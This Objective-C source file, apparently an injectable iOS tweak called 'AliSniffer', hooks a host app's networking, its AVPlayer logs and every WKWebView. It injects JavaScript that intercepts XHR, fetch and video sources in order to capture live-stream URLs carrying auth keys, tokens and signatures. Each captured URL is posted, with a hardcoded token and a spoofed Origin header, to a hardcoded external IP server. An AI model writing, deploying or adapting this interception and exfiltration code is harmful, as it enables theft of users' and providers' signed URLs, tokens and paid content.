#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <AVFoundation/AVFoundation.h>
#import <objc/runtime.h>

#pragma mark - 配置

static NSString * const kPushHost  = @"http://139.155.57.242:8088";
static NSString * const kPushToken = @"@Yy166431";
static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/push_raw", @"/push"]; }

static const NSTimeInterval kInstallDelay    = 2.0; // 注入后延迟装载所有模块
static const NSTimeInterval kWKScanInterval  = 2.0; // 扫描 WKWebView 周期
static const NSTimeInterval kDedupeWindow    = 60.0;

static const BOOL kPopupOnAuth  = YES;
static const BOOL kPopupOnPlain = YES;

#ifndef DEBUG_LOG
#define DEBUG_LOG 0
#endif
#if DEBUG_LOG
#define LOG(fmt, ...) NSLog((@"[AliSniffer] " fmt), ##__VA_ARGS__)
#else
#define LOG(...)
#endif

static dispatch_queue_t gq;
static NSMutableDictionary<NSString*,NSDate*> *g_seen;

#pragma mark - 工具

static inline void on_main(void(^blk)(void)){
    if (NSThread.isMainThread) blk(); else dispatch_async(dispatch_get_main_queue(), blk);
}
static UIWindow *keyWin(void){
    UIWindow *win = nil;
    if (@available(iOS 13.0,*)) {
        for (UIScene *s in UIApplication.sharedApplication.connectedScenes){
            if (![s isKindOfClass:UIWindowScene.class]) continue;
            UIWindowScene *sc = (UIWindowScene*)s;
            if (sc.activationState==UISceneActivationStateForegroundActive){
                for (UIWindow *w in sc.windows) if (w.isKeyWindow){ win=w; break; }
                if (win) break;
            }
        }
    }
    if (!win) win = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject;
    return win;
}
static void popup(NSString *title, NSString *msg, NSString *copyText){
    on_main(^{
        @try{
            UIWindow *w = keyWin(); if (!w) return;
            UIViewController *vc = w.rootViewController; while (vc.presentedViewController) vc = vc.presentedViewController;
            UIAlertController *ac = [UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
            if (copyText.length){
                [ac addAction:[UIAlertAction actionWithTitle:@"复制URL" style:UIAlertActionStyleDefault handler:^(__unused UIAlertAction *a){
                    UIPasteboard.generalPasteboard.string = copyText;
                }]];
            }
            [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            [vc presentViewController:ac animated:YES completion:nil];
        }@catch(__unused NSException *e){}
    });
}
static void popupLoaded(void){
    popup(@"AliSniffer 已加载", @"已启用：NSURLProtocol(被动)+AV+WK-JS 注入；auth_key 优先；命中即弹窗+复制+上报。", nil);
}

#pragma mark - URL 判定/上报/去重

static BOOL hasAuthLike(NSString *u){
    NSString *s = u.lowercaseString;
    return [s containsString:@"auth_key="]||[s containsString:@"txsecret="]||
           [s containsString:@"txkey="]   ||[s containsString:@"txTime="]||
           [s containsString:@"sign="]     ||[s containsString:@"token="]||
           [s containsString:@"auth="];
}
static BOOL looksLikeStream(NSString *u){
    NSString *s = u.lowercaseString;
    if ([s containsString:@".m3u8"]||[s containsString:@".flv"]||[s containsString:@".mp4"]||
        [s containsString:@".ts"]  ||[s hasPrefix:@"rtmp://"]) return YES;
    if ([s containsString:@".php"]||[s containsString:@"phonelive"]||
        [s containsString:@"replay"]||[s containsString:@"pull."]||
        [s containsString:@"weizan"]||[s containsString:@"vzan"]||
        [s containsString:@"live"]) return YES;
    if (hasAuthLike(u)) return YES;
    return NO;
}
static BOOL dedupe_skip(NSString *u){
    __block BOOL skip = NO;
    dispatch_sync(gq, ^{
        NSDate *now = [NSDate date], *last = g_seen[u];
        if (last && [now timeIntervalSinceDate:last] < kDedupeWindow) skip = YES;
        else { g_seen[u] = now; }
    });
    return skip;
}
static void postText(NSString *text){
    __block NSInteger i=0; NSArray *paths = kPushPaths();
    __block void (^tryNext)(void) = ^{
        if (i >= (NSInteger)paths.count) return;
        NSString *url = [kPushHost stringByAppendingString:paths[i++]];
        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
        req.HTTPMethod = @"POST";
        [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
        [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
        [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
        req.HTTPBody = [text dataUsingEncoding:NSUTF8StringEncoding];
        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e){
            NSInteger sc = [r isKindOfClass:NSHTTPURLResponse.class] ? ((NSHTTPURLResponse*)r).statusCode : -1;
            if (e || sc<200 || sc>=300) tryNext();
        }] resume];
    }; tryNext();
}
static void handleURL(NSString *u, NSString *from){
    if (!u.length || !looksLikeStream(u) || dedupe_skip(u)) return;
    BOOL auth = hasAuthLike(u);
    NSString *title = auth ? @"抓到 URL（auth_key 优先）" : @"抓到 URL";
    NSString *msg   = from ? [NSString stringWithFormat:@"%@\n%@", from, u] : u;
    postText(u);
    if (auth){ if (kPopupOnAuth)  { popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; } }
    else     { if (kPopupOnPlain) { popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; } }
}

#pragma mark - NSURLProtocol（只观测）

@interface AliPassiveProtocol : NSURLProtocol @end
@implementation AliPassiveProtocol
+ (BOOL)canInitWithRequest:(NSURLRequest *)req {
    @try{ NSString *u = req.URL.absoluteString; if (looksLikeStream(u)) dispatch_async(gq, ^{ handleURL(u, @"NSURLProtocol"); }); }@catch(...) {}
    return NO;
}
+ (BOOL)canInitWithTask:(NSURLSessionTask *)task {
    @try{
        NSURLRequest *req = task.currentRequest ?: task.originalRequest;
        NSString *u = req.URL.absoluteString; if (looksLikeStream(u)) dispatch_async(gq, ^{ handleURL(u, @"NSURLProtocol(Task)"); });
    }@catch(...) {}
    return NO;
}
+ (NSURLRequest *)canonicalRequestForRequest:(NSURLRequest *)r { return r; }
@end

#pragma mark - AVPlayer（只读 accessLog / errorLog）

static void installAVObservers(void){
    NSNotificationCenter *nc = NSNotificationCenter.defaultCenter;
    [nc addObserverForName:AVPlayerItemNewAccessLogEntryNotification object:nil queue:nil usingBlock:^(NSNotification *n){
        @try{
            id item = n.object;
            if ([item respondsToSelector:@selector(accessLog)]){
                id log = [item accessLog];
                if ([log respondsToSelector:@selector(events)]){
                    NSArray *evs = [log events];
                    id ev = evs.lastObject;
                    if (ev){
                        NSString *uri = nil;
                        if ([ev respondsToSelector:@selector(URI)]){
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                            uri = [ev performSelector:@selector(URI)];
#pragma clang diagnostic pop
                        }else if ([ev respondsToSelector:@selector(uri)]){
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                            uri = [ev performSelector:@selector(uri)];
#pragma clang diagnostic pop
                        }
                        if (uri.length) dispatch_async(gq, ^{ handleURL(uri, @"AVPlayerAccessLog"); });
                    }
                }
            }
        }@catch(...) {}
    }];
    [nc addObserverForName:AVPlayerItemNewErrorLogEntryNotification object:nil queue:nil usingBlock:^(NSNotification *n){
        @try{
            id item = n.object;
            if ([item respondsToSelector:@selector(errorLog)]){
                id log = [item errorLog];
                if ([log respondsToSelector:@selector(events)]){
                    for (id ev in [log events]){
                        NSString *uri = nil;
                        if ([ev respondsToSelector:@selector(URI)]){
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                            uri = [ev performSelector:@selector(URI)];
#pragma clang diagnostic pop
                        }else if ([ev respondsToSelector:@selector(uri)]){
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                            uri = [ev performSelector:@selector(uri)];
#pragma clang diagnostic pop
                        }
                        if (uri.length) dispatch_async(gq, ^{ handleURL(uri, @"AVPlayerErrorLog"); });
                    }
                }
            }
        }@catch(...) {}
    }];
}

#pragma mark - WKWebView：JS 注入（XMLHttpRequest / fetch / video.src）

/// JS 片段：安装拦听器 + 初次扫描
static NSString *AliJS(void){
    return
    @"(function(){"
      "var H=function(u){try{return/(\\.m3u8|\\.flv|\\.mp4|\\.ts|auth_key=|txsecret=|txkey=|txTime=|sign=|token=)/i.test(u||'');}catch(e){return false;}};"
      "var R=function(u){try{if(u&&H(u)&&window.webkit&&webkit.messageHandlers&&webkit.messageHandlers.AliSniffer){webkit.messageHandlers.AliSniffer.postMessage(u);}}catch(e){}};"
      "// XHR"
      "if(window.XMLHttpRequest){var _o=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){try{R(u);}catch(e){} return _o.apply(this,arguments);};}"
      "// fetch"
      "if(window.fetch){var _f=window.fetch;window.fetch=function(a,b){try{var u=(typeof a==='string')?a:(a&&a.url)||'';R(u);}catch(e){} return _f.apply(this,arguments);};}"
      "// <video>.src"
      "try{var d=Object.getOwnPropertyDescriptor(HTMLMediaElement.prototype,'src');"
          "Object.defineProperty(HTMLMediaElement.prototype,'src',{set:function(v){try{R(v);}catch(e){} return d.set.call(this,v);},get:d.get});}catch(e){}"
      "// 初次扫描"
      "try{var els=document.querySelectorAll('video,source,a,link,script');"
          "els&&els.forEach(function(el){var u=el.currentSrc||el.src||el.href||el.getAttribute&&el.getAttribute('data-url')||''; if(u) R(u);});}catch(e){}"
    "})();";
}

/// 负责处理 JS 回传
@interface AliWKBridge : NSObject<WKScriptMessageHandler>
@end
@implementation AliWKBridge
- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message{
    @try{
        if ([message.name isEqualToString:@"AliSniffer"]) {
            NSString *u = [message.body isKindOfClass:NSString.class] ? (NSString *)message.body : nil;
            if (u.length) dispatch_async(gq, ^{ handleURL(u, @"WK-JS"); });
        }
    }@catch(...) {}
}
@end
static AliWKBridge *g_bridge;

/// 给某个 WKWebView 注入：messageHandler + UserScript(documentStart) + 立即注入（当前页）
static void injectJSIntoWebView(WKWebView *wv){
    if (!wv) return;
    @try{
        WKUserContentController *ucc = wv.configuration.userContentController;
        if (!g_bridge) g_bridge = [AliWKBridge new];

        // 防重入：先移除再添加
        @try{ [ucc removeScriptMessageHandlerForName:@"AliSniffer"]; }@catch(...) {}
        [ucc addScriptMessageHandler:g_bridge name:@"AliSniffer"];

        // 文档起始注入（对之后加载的页面生效）
        WKUserScript *us = [[WKUserScript alloc] initWithSource:AliJS()
                                                  injectionTime:WKUserScriptInjectionTimeAtDocumentStart
                                               forMainFrameOnly:NO];
        // 先清旧的，避免越堆越多
        @try{ [ucc removeAllUserScripts]; }@catch(...) {}
        [ucc addUserScript:us];

        // 对“当前已加载的页面”立刻注入一次（不重载）
        [wv evaluateJavaScript:AliJS() completionHandler:nil];
        LOG(@"WK injected on %@", wv);
    }@catch(...) {}
}

/// 轮询扫描所有窗口中的 WKWebView，发现就注入
static void startWKScanLoop(void){
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_BACKGROUND,0), ^{
        while (1) {
            @autoreleasepool {
                @try{
                    for (UIWindow *w in UIApplication.sharedApplication.windows){
                        NSMutableArray<UIView*> *stack = [NSMutableArray arrayWithObject:w];
                        while (stack.count){
                            UIView *v = stack.lastObject; [stack removeLastObject];
                            if ([v isKindOfClass:WKWebView.class]){
                                injectJSIntoWebView((WKWebView*)v);
                            }
                            for (UIView *s in v.subviews) [stack addObject:s];
                        }
                    }
                }@catch(...) {}
            }
            [NSThread sleepForTimeInterval:kWKScanInterval];
        }
    });
}

#pragma mark - 安装所有通道

static void install_all(void){
    @try{
        [NSURLProtocol registerClass:AliPassiveProtocol.class];
        installAVObservers();
        startWKScanLoop();
        popupLoaded();
    }@catch(...) {}
}

#pragma mark - 入口

__attribute__((constructor))
static void AliSnifferInit(void){
    @try{
        if (!gq) gq = dispatch_queue_create("com.alisniffer.queue", DISPATCH_QUEUE_SERIAL);
        if (!g_seen) g_seen = [NSMutableDictionary dictionary];
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kInstallDelay*NSEC_PER_SEC)),
                       dispatch_get_main_queue(), ^{ install_all(); });
    }@catch(...) {}
}
